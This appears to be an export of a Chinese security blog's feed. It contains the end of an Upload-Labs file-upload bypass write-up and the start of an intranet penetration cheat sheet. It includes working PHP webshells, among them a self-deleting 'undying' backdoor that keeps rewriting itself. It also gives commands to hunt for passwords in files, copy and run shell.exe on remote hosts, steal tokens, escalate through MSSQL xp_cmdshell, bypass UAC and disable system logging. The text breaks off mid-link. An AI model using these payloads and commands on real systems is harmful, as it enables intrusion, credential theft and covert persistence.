class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br></pre></td></tr></table></figure><h5 id="姿势一-2"><a href="#姿势一-2" class="headerlink" title="姿势一"></a>姿势一</h5><p>大小写绕过，上面已经写了</p><h5 id="姿势二-3"><a href="#姿势二-3" class="headerlink" title="姿势二"></a>姿势二</h5><p>.user.ini 上传绕过</p><h5 id="姿势三"><a href="#姿势三" class="headerlink" title="姿势三"></a>姿势三</h5><p>空格绕过</p><h5 id="姿势四"><a href="#姿势四" class="headerlink" title="姿势四"></a>姿势四</h5><p><code>.</code>绕过</p><h5 id="姿势五"><a href="#姿势五" class="headerlink" title="姿势五"></a>姿势五</h5><p>::$DATA绕过</p><h4 id="第二十一关"><a href="#第二十一关" class="headerlink" title="第二十一关"></a>第二十一关</h4><p>检查了Content-Type，不过这个好绕过。重点是下面这个</p><p>函数绕过关键位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name &#x3D; reset($file) . &#39;.&#39; . $file[count($file) - 1];</span><br></pre></td></tr></table></figure><p>后端也即是<code>$file</code>获取的是个数组，其中<code>$file[0]</code>为<code>upload-20file</code>，<code>$file[3]</code>为<code>png</code></p><p>所以<code>count($file)=2</code></p><p>那么<code>$file[count($file) - 1] ==&gt; $file[1]</code>  POST的时候没对<code>$file[1]赋值</code>，所以为空。 </p><p>而<code>reset($file)=test.php</code></p><p>所以整个组合起来就是  <code>test.php.</code></p><p><code>Windows</code>创建<code>test.php.</code>的时候会忽略最后一个点</p><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo/images/20201107170002.png" alt="image-20201107170002502"></p><h1 id="上传总结"><a href="#上传总结" class="headerlink" title="上传总结"></a>上传总结</h1><p><a href="https://www.anquanke.com/post/id/219107">https://www.anquanke.com/post/id/219107</a></p><h1 id="文件上传Bypass"><a href="#文件上传Bypass" class="headerlink" title="文件上传Bypass"></a>文件上传Bypass</h1><h3 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h3><p>安全狗对于http头字段： Content-Disposition: 处理的不是很好， 当长度增加到48930的时候，安全狗的上传防御就失效了。结果如下图：</p><p><img src="https://pureqh.top/wp-content/uploads/2019/07/image-56.png" alt="img"></p><h3 id="使用其他标签绕过"><a href="#使用其他标签绕过" class="headerlink" title="使用其他标签绕过"></a>使用其他标签绕过</h3><p>例如，上传的时候过滤了<code>&lt;?</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;</span><br><span class="line">phpinfo();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>或者使用段标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&#x3D;&#96;$_GET[x]&#96;?&gt;</span><br></pre></td></tr></table></figure><h3 id="其他绕过方式"><a href="#其他绕过方式" class="headerlink" title="其他绕过方式"></a>其他绕过方式</h3><p>方式一：</p><p>将<code>filename=&quot;shell.php&quot;</code> 改为 <code>filename=shell.php;</code></p><p>方式二：</p><p>将<code>filename=&quot;shell.php&quot;</code>改为<code>filename==&quot;shell.php&quot;</code></p><p>方法三：</p><p>将<code>filename=&quot;shell.php&quot;</code>改为<code>filename=&quot;shell;shel.php&quot;</code></p><p>方式四：</p><p>将<code>filename=&quot;shell.php&quot;</code>改为<code>filename=&quot;shell.txt&quot; filename=&quot;shell.php&quot;</code></p><h3 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h3><p><strong>内存马</strong>，就是会运行一段永远不退出的程序常驻在PHP进程里，无限执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不死马.php → 上传到server → server执行文件 → server本地无限循环生成 (一句话.php)</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ignore_user_abort(<span class="literal">true</span>);  <span class="comment">//这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。</span></span><br><span class="line">set_time_limit(<span class="number">0</span>);  <span class="comment">//函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。</span></span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);  <span class="comment">//删除文件本身，以起到隐蔽自身的作用。</span></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;2.php&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    file_put_contents(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">    system(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .2.php&#x27;</span>);</span><br><span class="line">    usleep(<span class="number">5000</span>);  <span class="comment">//循环内每隔usleep(5000)即写新的后门文件</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>改进</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line"> set_time_limit(<span class="number">0</span>);</span><br><span class="line"> <span class="variable">$file</span> = <span class="string">&#x27;c.php&#x27;</span>;</span><br><span class="line"> <span class="variable">$code</span> = base64_decode(<span class="string">&#x27;PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+&#x27;</span>); <span class="comment">//<span class="meta">&lt;?php</span> eval($_POST[c]);<span class="meta">?&gt;</span></span></span><br><span class="line"> <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">     <span class="keyword">if</span>(md5(file_get_contents(<span class="variable">$file</span>))===md5(<span class="variable">$cod0e0</span>)) &#123;</span><br><span class="line">         file_put_contents(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     usleep(<span class="number">50</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件上传&quot;&gt;&lt;a href=&quot;#文件上传&quot; class=&quot;headerlink&quot; title=&quot;文件上传&quot;&gt;&lt;/a&gt;文件上传&lt;/h1&gt;&lt;h2 id=&quot;Upload-Labs&quot;&gt;&lt;a href=&quot;#Upload-Labs&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    
    <category term="文件上传" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透总结</title>
    <link href="http://example.com/2021/03/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <id>http://example.com/2021/03/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</id>
    <published>2021-03-02T08:18:03.000Z</published>
    <updated>2021-03-26T06:40:34.709Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网渗透总结"><a href="#内网渗透总结" class="headerlink" title="内网渗透总结"></a>内网渗透总结</h1><p>对内网渗透做了个总结，会持续更新、补充、修改……</p><h2 id="隧道、代理、端口转发"><a href="#隧道、代理、端口转发" class="headerlink" title="隧道、代理、端口转发"></a>隧道、代理、端口转发</h2><h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><h4 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h4><p>只支持<code>TCP</code>，不支持<code>UDP</code>和<code>ICMP</code>等</p><p>与<code>nmap</code>使用的时候，会出现问题。需要在配置文件中，注释掉<code>proxy_dns</code></p><p>windows端：<a href="https://github.com/shunf4/proxychains-windows.git">https://github.com/shunf4/proxychains-windows.git</a></p><h4 id="proxifier"><a href="#proxifier" class="headerlink" title="proxifier"></a>proxifier</h4><p>适用windows</p><h3 id="隧道搭建"><a href="#隧道搭建" class="headerlink" title="隧道搭建"></a>隧道搭建</h3><h4 id="判断协议出网"><a href="#判断协议出网" class="headerlink" title="判断协议出网"></a>判断协议出网</h4><p>dns</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup 8.8.8.8  # windows</span><br><span class="line">dig 8.8.8.8   # linux</span><br></pre></td></tr></table></figure><p>http</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl www.baidu.com   # windows</span><br><span class="line">wget www.baidu.com</span><br></pre></td></tr></table></figure><p>icmp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping www.baidu.com</span><br></pre></td></tr></table></figure><p>tcp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet www.baidu.com</span><br></pre></td></tr></table></figure><h4 id="搭建隧道"><a href="#搭建隧道" class="headerlink" title="搭建隧道"></a>搭建隧道</h4><p>收集于：<a href="https://xz.aliyun.com/t/7701">https://xz.aliyun.com/t/7701</a></p><h5 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h5><p>ICMP隧道</p><ul><li><p><a href="https://github.com/inquisb/icmpsh">icmpsh</a></p><blockquote><p>能通过ICMP协议反弹cmd，功能单一，反弹回来的cmd极不稳定，不推荐使用</p></blockquote></li><li><p><a href="https://github.com/DhavalKapil/icmptunnel">icmptunnel</a></p><blockquote><p>创建虚拟网卡通过ICMP协议传输网卡流量，基于ICMP隧道的vpn，需要root权限，动静极大，不推荐使用</p></blockquote></li><li><p><a href="https://github.com/esrrhs/pingtunnel">pingtunnel</a></p><blockquote><p>tcp、udp、socks5 over ICMP，速度快，连接稳定，跨平台，client模式不需要管理员权限即可正常使用，推荐使用</p></blockquote></li></ul><h5 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h5><p>TCP隧道、UDP隧道</p><ul><li><p>netcat</p><blockquote><p>网络工具中的瑞士军刀，不多介绍，linux系统一般自带</p></blockquote></li><li><p>powercat</p><blockquote><p>powershell版的netcat</p></blockquote></li><li><p>socat</p><blockquote><p>具有记录转发流的功能，方便查看转发内容，需要安装</p></blockquote></li><li><p>netsh</p><blockquote><p>windows系统自带的网络配置工具</p></blockquote></li><li><p>lcx</p><blockquote><p>端口转发工具</p></blockquote></li><li><p>NATBypass</p><blockquote><p>一款lcx在golang下的实现,更好的跨平台，更完善的文档</p></blockquote></li><li><p>iox</p><blockquote><p>端口转发 &amp; 内网代理工具，功能类似于lcx/ew，简化了命令行参数，支持UDP流量转发，更好的跨平台。缺点：不支持监听指定IP，默认监听0.0.0.0:port，会增大暴露风险</p></blockquote></li></ul><h5 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h5><p>由于应用层协议极多，对应的隧道工具也很多，我们常用来做隧道的协议一般是DNS、HTTP、SSH、SOCKS等</p><ul><li><p>dnscat2</p><blockquote><p>不仅可以创建DNS隧道，更是C2</p><p><a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a></p></blockquote></li><li><p>dnscat2-powershell</p><blockquote><p>dnscat2的powershell客户端</p></blockquote></li><li><p>dns2tcp</p><blockquote><p>TCP over DNS,即通过DNS隧道转发TCP连接</p></blockquote></li><li><p>iodine</p><blockquote><p>IPv4 over DNS，即通过DNS隧道转发IPv4数据包</p></blockquote></li><li><p>reGeorg</p><blockquote><p>SOCKS over HTTP,即通过HTTP隧道转发SOCKS</p></blockquote></li><li><p>Neo-reGeorg</p><blockquote><p>重构版reGeorg，提高稳定性和可用性，避免特征检测，更新活跃</p><p><a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p></blockquote></li><li><p>reDuh</p><blockquote><p>TCP over HTTP,即通过HTTP隧道转发TCP连接，隧道不稳定</p></blockquote></li><li><p>Tunna</p><blockquote><p>TCP、SOCKS over HTTP,即通过HTTP隧道转发TCP连接和SOCKS，隧道不稳定</p></blockquote></li><li><p>ABPTTS</p><blockquote><p>TCP over HTTP,即通过HTTP隧道转发TCP连接,数据加密，可自定义HTTP数据，对抗特征检测十分优秀，创建的隧道十分稳定，比较遗憾的是支持的web脚本类型只有aspx和jsp</p></blockquote></li><li><p>EarthWorm</p><blockquote><p>十分方便的多级SOCKS代理，已经永久停止更新</p></blockquote></li><li><p>Termite</p><blockquote><p>EarthWorm的升级版，已经永久停止更新</p></blockquote></li><li><p>Venom</p><blockquote><p>Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具。</p></blockquote></li><li><p>ssocks</p><blockquote><p>正向和反向的socks工具，可执行文件的大小很小</p></blockquote></li><li><p>s5.go</p><blockquote><p>go语言编写的socks服务工具，良好的跨平台特性</p></blockquote></li><li><p>ssh</p><p><a href="http://www.zsythink.net/archives/2450">http://www.zsythink.net/archives/2450</a></p><blockquote><p>-C 压缩传输，提高传输速度<br>-f 后台执行数据传输<br>-N 建立静默连接<br>-g 允许远程主机连接本地用于转发的端口<br>-L 本地端口转发<br>-R 远程端口转发<br>-D 动态转发，即SOCKS代理<br>-p 指定ssh连接端口</p></blockquote><p>配置文件 /etc/ssh/sshd_config</p><blockquote><p>AllowAgentForwarding yes<br>AllowTcpForwarding yes<br>GatewayPorts yes</p></blockquote><p>本地转发：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CNfg -L 127.0.0.1:7777:114.114.114.114:9999 root@192.168.1.1</span><br><span class="line">#ssh客户端监听127.0.0.1:7777, 将收到的tcp数据包通过连接到192.168.1.1的ssh隧道转发到ssh服务端，再由服务端转发到114.114.114.114:9999</span><br></pre></td></tr></table></figure><p>远程转发：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CNfg -R 127.0.0.1:7777:114.114.114.114:9999 root@192.168.1.1</span><br><span class="line">#ssh服务端监听127.0.0.1:7777, 将收到的tcp数据包通过连接到192.168.1.1的ssh隧道转发到ssh客户端，再由ssh客户端转发到114.114.114.114:9999</span><br></pre></td></tr></table></figure><p>动态转发：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CNfg -D 127.0.0.1:7777 root@192.168.1.1</span><br><span class="line"># ssh客户端监听127.0.0.1:7777开启socks服务，将收到的socks数据包通过连接到192.168.1.1的ssh隧道转发到ssh服务端，再由ssh服务端转发到目标地址</span><br></pre></td></tr></table></figure><h2 id="关闭系统日志记录"><a href="#关闭系统日志记录" class="headerlink" title="关闭系统日志记录"></a>关闭系统日志记录</h2></li></ul><p>提权后关闭系统日志记录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">工具：https:&#x2F;&#x2F;github.com&#x2F;hlldz&#x2F;Invoke-Phant0m.git</span><br></pre></td></tr></table></figure><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul><li><p>查看当前用户及权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami &#x2F;user</span><br><span class="line">whoami &#x2F;priv</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>查看在线用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query user | quser</span><br><span class="line"># 避开管理员</span><br></pre></td></tr></table></figure></li><li><p>查看当前用户属组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user [username]</span><br></pre></td></tr></table></figure></li><li><p>查看主机名、工作组/域、操作系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">net config workstation</span><br><span class="line"></span><br><span class="line">wmic OS get Caption, CSDVersion, OSArchitecture, Version</span><br></pre></td></tr></table></figure></li><li><p>补丁信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WMIC.exe qfe get HotFixID   </span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;&gt; 查询可提权网站：http:&#x2F;&#x2F;bugs.hacking8.com&#x2F;tiquan&#x2F;</span><br><span class="line">&gt;&gt;&gt;&gt; 使用工具查询：https:&#x2F;&#x2F;github.com&#x2F;AonCyberLabs&#x2F;Windows-Exploit-Suggester.git</span><br></pre></td></tr></table></figure></li><li><p>杀软信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;namespace:\\root\securitycenter2 path antivirusproduct GET displayName</span><br></pre></td></tr></table></figure></li><li><p>搜索域控</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WMIC.exe ntdomain</span><br><span class="line">net time &#x2F;domain</span><br></pre></td></tr></table></figure></li><li><p>收集敏感信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 敏感文件收集</span><br><span class="line">dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*.txt|*.xml|*.mdb|*.sql|*.mdf|*.eml|*.pst|*conf*|*bak*|*pwd*|*pass*|*login*|*user*&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 账号密码收集</span><br><span class="line">findstr &#x2F;si pass *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line"></span><br><span class="line">findstr &#x2F;si userpwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line"></span><br><span class="line">findstr &#x2F;si password *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line"></span><br><span class="line">findstr &#x2F;si login *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line"></span><br><span class="line">findstr &#x2F;si user *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line"></span><br><span class="line">findstr &#x2F;si pwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line"></span><br><span class="line">findstr &#x2F;si username *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br></pre></td></tr></table></figure></li><li><p>查看目标主机共享</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net view \\target-ip   # 是否用空密码访问权限，如果知道用户名和密码</span><br><span class="line">copy shell.exe \\ip\c$\windows\temp\shell.exe</span><br></pre></td></tr></table></figure></li><li><p>执行后门</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">psexec \\ip -u userName -p userPass cmd.exe c:\windows\temp\shell.exe</span><br><span class="line"></span><br><span class="line">csript.exe wmiexec.vbs &#x2F;cmd domainName userName userPass &quot;ipconfig&quot;</span><br><span class="line"></span><br><span class="line">wmic &#x2F;node:ip &#x2F;user:userName &#x2F;password:userPass process call create &quot;C:\Windows\temp\shell.exe&quot;</span><br></pre></td></tr></table></figure><h2 id="收集用户口令"><a href="#收集用户口令" class="headerlink" title="收集用户口令"></a>收集用户口令</h2></li></ul><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><p>mimikatz、LaZagne</p><p>Xshell凭证</p><p>远程连接凭证：<a href="https://github.com/3gstudent/List-RDP-Connections-History.git">https://github.com/3gstudent/List-RDP-Connections-History.git</a></p><h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find .&#x2F; -type f -regex &#39;.*\.txt|.*\.xml|.*\.php|.*\.jsp|.*\.conf|.*\.bak|.*\.js|.*\.inc|.*\.htpasswd|.*\.inf|.*\.ini|.*\.log|.*\.new&#39; | xargs egrep &quot;user|uname|pass|pwd|admin&quot;</span><br><span class="line"></span><br><span class="line">cat &#x2F;root&#x2F;.bash_history|grep -Ei -C 2 &#39;ssh|mysql|ftp|scp|su|root|passwd&#39;</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>查找具有特殊权限的二进制文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h4 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 列出可以盗取的凭证</span><br><span class="line">incognito.exe list_tikens -u</span><br><span class="line"></span><br><span class="line">incognito.exe execute -c &quot;&lt;上面列出的tokens，如test.com\administrator&gt;&quot; cmd.exe</span><br><span class="line"></span><br><span class="line"># 使用MSF</span><br><span class="line">use incognito   # 加载模块</span><br><span class="line">list_tokens -u    # 列出能盗取的令牌</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;  # 偷取指定用户令牌</span><br></pre></td></tr></table></figure><h4 id="Mysql提权"><a href="#Mysql提权" class="headerlink" title="Mysql提权"></a>Mysql提权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">udf提权：通过创建用户自定义函数，对mysql功能进行扩充，可以执行系统任意命令，将mysql账号root转化为系统system权限。</span><br><span class="line">mof提权：在windows平台下，c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof 这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将我们先要做的事通过代码存储到这个mof文件中，就可以实现权限提升。</span><br><span class="line">启动项提权：将后面脚本上传到系统启动目录，当服务器重启就会自动执行该脚本，从而获取系统权限。</span><br></pre></td></tr></table></figure><h4 id="MSSQL提权"><a href="#MSSQL提权" class="headerlink" title="MSSQL提权"></a>MSSQL提权</h4><p><strong>使用xp_cmdshell 提权</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 启用xp_cmdshell</span><br><span class="line">EXEC master..sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC master..sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;</span><br><span class="line"># 通过xp_cmdshell执行系统命令</span><br><span class="line">Exec master.dbo.xp_cmdshell &#39;whoami&#39;</span><br></pre></td></tr></table></figure><p><strong>使用sp_oacreate提权</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 开启组件</span><br><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1;RECONFIGURE WITH OVERRIDE;   </span><br><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 0;</span><br><span class="line"></span><br><span class="line"># 执行系统命令（无回显）</span><br><span class="line">declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe &#x2F;c whoami&#39;</span><br></pre></td></tr></table></figure><h4 id="通过沙盒提权"><a href="#通过沙盒提权" class="headerlink" title="通过沙盒提权"></a><strong>通过沙盒提权</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 开启沙盒</span><br><span class="line">exec master..xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;,&#39;SandBoxMode&#39;,&#39;REG_DWORD&#39;,1</span><br><span class="line"># 利用jet.oledb执行命令</span><br><span class="line">select * from openrowset(&#39;microsoft.jet.oledb.4.0&#39;,&#39;;database&#x3D;c:\windows\system32\ias\dnary.mdb&#39;,&#39;select shell(&quot;whoami&quot;)&#39;)</span><br></pre></td></tr></table></figure><h4 id="BypassUAC"><a href="#BypassUAC" class="headerlink" title="BypassUAC"></a>BypassUAC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac </span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">meterpreter &gt; getsystem</span><br></pre></td></tr></table></figure><h4 id="提权项目"><a href="#提权项目" class="headerlink" title="提权项目"></a>提权项目</h4><p><a href="https://github.com/Ascotbe/Kernelhub">https://github.com/Ascotbe/Kernelhub</a></p><h4 id="Windows本地提权-CVE-2021-1732"><a href="#Windows本地提权-CVE-2021-1732" class="headerlink" title="Windows本地提权(CVE-2021-1732)"></a>Windows本地提权(CVE-2021-1732)</h4><p><a href="https://github.com/KaLendsi/CVE-2021-1732-Exploit.git">https://github.com/KaLendsi/CVE-2021-1732-Exploit.git</a></p><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="sudo-提权"><a href="#sudo-提权" class="headerlink" title="sudo 提权"></a>sudo 提权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -l   # 查看查看当前⽤户允许执⾏的提权命令。</span><br><span class="line">sudo -u root &#x2F;tmp&#x2F;tiquan.sh</span><br></pre></td></tr></table></figure><h4 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 查看 suid 的文件</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line"># 查看 guid 的文件</span><br><span class="line">find &#x2F; -perm -g&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><h4 id="特殊命令提权"><a href="#特殊命令提权" class="headerlink" title="特殊命令提权"></a>特殊命令提权</h4><p><a 